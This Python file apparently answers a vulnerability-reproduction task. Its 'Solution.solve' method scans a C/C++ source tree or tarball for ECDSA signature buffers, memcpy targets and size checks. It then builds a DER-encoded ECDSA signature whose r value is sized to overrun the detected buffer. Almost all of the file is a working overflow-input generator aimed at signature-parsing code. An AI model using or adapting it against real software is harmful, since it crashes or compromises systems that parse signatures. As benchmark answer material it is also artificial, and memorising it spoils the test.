import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _parse_int_literal(tok: str) -> Optional[int]:
    if not tok:
        return None
    t = tok.strip()
    t = t.strip("()")
    t = t.rstrip("uUlL")
    t = t.strip()
    if not t:
        return None
    try:
        if t.lower().startswith("0x"):
            return int(t, 16)
        return int(t, 10)
    except Exception:
        return None


def _der_len_bytes(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n <= 0x7F:
        return bytes([n])
    out = []
    x = n
    while x > 0:
        out.append(x & 0xFF)
        x >>= 8
    out.reverse()
    return bytes([0x80 | len(out)]) + bytes(out)


def _der_integer(content: bytes) -> bytes:
    if len(content) == 0:
        content = b"\x00"
    if content[0] & 0x80:
        content = b"\x00" + content
    return b"\x02" + _der_len_bytes(len(content)) + content


def _der_sequence(content: bytes) -> bytes:
    return b"\x30" + _der_len_bytes(len(content)) + content


def _build_ecdsa_sig_asn1(r_len: int, s_len: int = 1) -> bytes:
    if r_len <= 0:
        r_len = 1
    if s_len <= 0:
        s_len = 1
    r_content = b"\x01" * r_len
    s_content = b"\x01" * s_len
    seq_content = _der_integer(r_content) + _der_integer(s_content)
    return _der_sequence(seq_content)


def _iter_source_texts_from_dir(root: str, max_bytes: int = 2 * 1024 * 1024) -> Iterable[Tuple[str, str]]:
    for base, _, files in os.walk(root):
        for fn in files:
            if not fn.lower().endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh")):
                continue
            p = os.path.join(base, fn)
            try:
                st = os.stat(p)
                if st.st_size <= 0 or st.st_size > max_bytes:
                    continue
                with open(p, "rb") as f:
                    data = f.read(max_bytes + 1)
                if len(data) > max_bytes:
                    continue
                yield p, data.decode("latin-1", errors="ignore")
            except Exception:
                continue


def _iter_source_texts_from_tar(tar_path: str, max_bytes: int = 2 * 1024 * 1024) -> Iterable[Tuple[str, str]]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not name.lower().endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh")):
                    continue
                if m.size <= 0 or m.size > max_bytes:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(max_bytes + 1)
                    if len(data) > max_bytes:
                        continue
                    yield name, data.decode("latin-1", errors="ignore")
                except Exception:
                    continue
    except Exception:
        return


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_source_texts_from_dir(src_path)
    else:
        yield from _iter_source_texts_from_tar(src_path)


_DEFINE_RE = re.compile(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*(?:/\*.*\*/\s*)?(?://.*)?$",
                        re.MULTILINE)
_ARRAY_RE = re.compile(
    r"\b(?:unsigned\s+char|u8|uint8_t|char|BYTE)\s+([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*([A-Za-z_0-9]+)\s*\]\s*;"
)
_MEMCPY_DST_RE = re.compile(r"\b(?:memcpy|memmove|bcopy)\s*\(\s*&?\s*([A-Za-z_][A-Za-z0-9_]*)\s*(?:\[|\s*,)")
_UPPER_BOUND_RE = re.compile(
    r"\bif\s*\(\s*(?:\(\s*)?([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\s*(?:>=|>)\s*((?:0x)?[0-9A-Fa-f]+)\b"
)
_KEYWORD_NAME_RE = re.compile(r"(sig|sign|ecdsa|asn1|der|raw|buf|tmp|r|s)", re.IGNORECASE)


def _collect_macros(texts: List[Tuple[str, str]]) -> Dict[str, int]:
    macros: Dict[str, int] = {}
    for _, txt in texts:
        for m in _DEFINE_RE.finditer(txt):
            name = m.group(1)
            rhs = m.group(2).strip()
            rhs = rhs.split()[0]
            rhs = rhs.strip()
            rhs = rhs.strip("()")
            rhs = rhs.rstrip("uUlL")
            val = _parse_int_literal(rhs)
            if val is None:
                continue
            if 0 <= val <= 10_000_000:
                macros[name] = val
    return macros


def _infer_attack_len(src_path: str) -> int:
    texts = list(_iter_source_texts(src_path))
    if not texts:
        return 50000

    macros = _collect_macros(texts)

    macro_candidates: List[int] = []
    for k, v in macros.items():
        ku = k.upper()
        if "ECDSA" in ku and ("SIG" in ku or "SIGN" in ku or "ASN1" in ku or "DER" in ku):
            if 8 <= v <= 500_000:
                macro_candidates.append(v)

    memcpy_sizes: List[int] = []
    upper_bounds: List[int] = []

    for _, txt in texts:
        low = txt.lower()
        if "ecdsa" not in low:
            continue
        if ("asn1" not in low) and ("der" not in low) and ("signature" not in low) and ("sig" not in low):
            continue

        arrays: Dict[str, int] = {}
        for m in _ARRAY_RE.finditer(txt):
            var = m.group(1)
            sz_tok = m.group(2)
            sz = _parse_int_literal(sz_tok)
            if sz is None:
                sz = macros.get(sz_tok)
            if sz is None:
                continue
            if 1 <= sz <= 2_000_000:
                arrays[var] = sz

        for m in _MEMCPY_DST_RE.finditer(txt):
            var = m.group(1)
            if var in arrays:
                sz = arrays[var]
                if 8 <= sz <= 500_000 and _KEYWORD_NAME_RE.search(var):
                    memcpy_sizes.append(sz)

        for m in _UPPER_BOUND_RE.finditer(txt):
            var = m.group(1)
            if not _KEYWORD_NAME_RE.search(var):
                continue
            n = _parse_int_literal(m.group(2))
            if n is None:
                continue
            if 8 <= n <= 500_000:
                upper_bounds.append(n)

    buf_size_est = 0
    if memcpy_sizes:
        buf_size_est = max(memcpy_sizes)
    elif macro_candidates:
        buf_size_est = max(macro_candidates)

    max_allowed = None
    if upper_bounds:
        max_allowed = min(upper_bounds)

    if buf_size_est > 0:
        attack = buf_size_est + 1
        if attack < 1024:
            attack = 1024
        if max_allowed is not None:
            if attack > max_allowed and (buf_size_est + 1) <= max_allowed:
                attack = buf_size_est + 1
            elif attack > max_allowed:
                attack = max_allowed
                if attack <= buf_size_est:
                    attack = max_allowed
        if attack < 1:
            attack = 1024
        if attack > 500_000:
            attack = 500_000
        return attack

    if max_allowed is not None:
        return max(1024, min(max_allowed, 50000))

    return 50000


class Solution:
    def solve(self, src_path: str) -> bytes:
        attack_len = _infer_attack_len(src_path)
        if attack_len < 1:
            attack_len = 50000
        return _build_ecdsa_sig_asn1(attack_len, 1)